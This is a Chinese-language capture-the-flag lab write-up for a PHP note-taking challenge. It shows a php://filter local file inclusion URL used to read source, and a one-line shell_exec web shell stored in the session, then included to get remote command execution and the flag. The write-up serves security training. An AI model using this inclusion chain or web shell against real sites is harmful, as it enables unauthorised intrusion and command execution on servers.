# LAB - Hakka MD
###### tags: `資安` `Web`

## 題目解析
主頁是一個筆記平台形式，有輸入的地方，按下 post 可以記錄你做的筆記。

![](https://i.imgur.com/MWHkb2l.png)

但我們輸入 test 看到他噴了一個 warning，這個錯誤是用 header()嘗試跳轉頁面，但前面有其他內容。

![](https://i.imgur.com/hss3RpK.png)

按下筆記列表仍然可以看到我們記的筆記。

![](https://i.imgur.com/VjiM842.png)


## 解題流程
看到他有傳輸 module=modoule/home.php 的參數，合理懷疑可以用 LFI 的方式讀取網站 Source code。

![](https://i.imgur.com/5HFrtun.png)

主頁就是把我們的筆記傳輸過去，一個 form POST 過去，應該不太重要，我們可以直接試試看按下 Post 後跳轉的頁面 (module/post,php)。然後因為是 PHP，我們直接用 PHP filter 去讀讀看 module/post.php 的檔案過 base-64 encode。
```
http://splitline.tw:8401/?module=php://filter/convert.base64-encode/resource=module/post.php
```
成功拿到一串 base-64 encode 的字串，用 CyberChef 轉換回來可以看到 Source code，看來他是把我們的筆記直接存成 Session。

![](https://i.imgur.com/djU9Bct.png)

再來看一下接下來的跳轉頁面，筆記列頁面是不是就是讀我們存的 Session 顯示出來。
```
http://splitline.tw:8401/?module=php://filter/convert.base64-encode/resource=module/post.php
```
果然他是直接讀前一步 post.php 存的 Session，因此我們就可以想說把一些惡意程式當成 note 寫進 Session。

![](https://i.imgur.com/jOUZlHY.png)

再來就是建構惡意 Session，這樣只要我們主動去抓 Session 檔案，就能執行我們的惡意程式。

在首頁輸入框輸入 php 的 shell_exec() 函式。
```php=
<?php echo shell_exec($_GET['cmd']);?>
```
我們看一下 list，有儲存成功但因為我們沒傳 cmd 參數，所以現在是沒有值的，可以看到一個空的筆記。

![](https://i.imgur.com/kPY4I5D.png)

來去看一下主頁提供的 phpinfo()，Session path 是空的，如果沒有特別設定，php 的 Session 會存在 /var/lib/php/session 底下。

![](https://i.imgur.com/FGOaTi0.png)

接著就是直接去 include 我們的 Session 檔案，Session 檔名預設是 sess_\<SESSIONID>，F12 看一下我們的 session_id。

![](https://i.imgur.com/ik0l9YV.png)

直接去 include Session 檔案，傳個 ls 看看有沒有成功。

![](https://i.imgur.com/lXGLHKe.png)

看來是成功做到 RCE 了，再來就是找 FLAG，從根目錄找起，一找就找到了。

![](https://i.imgur.com/2YJjQW9.png)

## FLAG 截圖
![](https://i.imgur.com/npRv4u6.png)
